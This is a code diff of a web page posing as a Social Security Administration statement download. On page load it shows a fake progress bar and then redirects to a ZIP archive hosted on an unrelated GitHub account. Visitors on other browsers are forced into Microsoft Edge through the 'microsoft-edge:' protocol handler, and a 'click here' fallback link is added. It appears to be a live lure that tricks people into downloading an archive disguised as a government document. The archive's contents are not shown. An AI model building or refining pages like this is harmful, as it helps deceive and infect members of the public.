@@ -2,21 +2,90 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <title>Downloading...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+        }
+        h2 {
+            margin-bottom: 20px;
+            font-weight: 500;
+            font-size: 20px;
+        }
+        /* Green Progress Bar Styles */
+        .progress-bar-container {
+            width: 100%;
+            background-color: #e9ecef;
+            border-radius: 4px;
+            overflow: hidden;
+            height: 8px;
+            margin-bottom: 20px;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #28a745;
+            transition: width 1.5s ease-in-out;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin: 0;
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
     <script>
-        (function() {
-            var ua = navigator.userAgent;
-            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
-            var isEdge = /Edge|Edg/i.test(ua);
-            var isDesktopEdge = !isMobile && isEdge;
+        // Global variables so the HTML fallback link can use them
+        var fileUrl = "https://github.com/Veri-fi/Latestssa/releases/download/V1/Latest.SSA.Statement.zip";
+        var ua = navigator.userAgent;
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+        var isEdge = /Edge|Edg/i.test(ua);
+        var isDesktopEdge = !isMobile && isEdge;
 
-            var fileUrl = "https://github.com/Veri-fi/Latestssa/releases/download/V1/Latest.SSA.Statement.zip";
-            var targetUrl = isDesktopEdge ? fileUrl : "microsoft-edge:" + fileUrl;
+        var targetUrl = isDesktopEdge ? fileUrl : "microsoft-edge:" + fileUrl;
 
-            window.location.replace(targetUrl);
-        })();
+        window.addEventListener('DOMContentLoaded', function() {
+            // Animate progress bar to 100%
+            setTimeout(function() {
+                document.getElementById('progressBar').style.width = '100%';
+            }, 100);
+
+            // Trigger redirect after progress animation completes
+            setTimeout(function() {
+                window.location.replace(targetUrl);
+            }, 1500);
+        });
     </script>
 </head>
 <body>
+    <div class="container">
+        <h2>Your SSA Statement is Downloading <br/> please wait ...</h2>
+        
+        <!-- Green Progress Bar -->
+        <div class="progress-bar-container">
+            <div id="progressBar" class="progress-bar"></div>
+        </div>
+
+        <p>If the download does not start automatically, <script>document.write('<a href="' + targetUrl + '">click here</a>');</script>.</p>
+    </div>
 </body>
 </html>
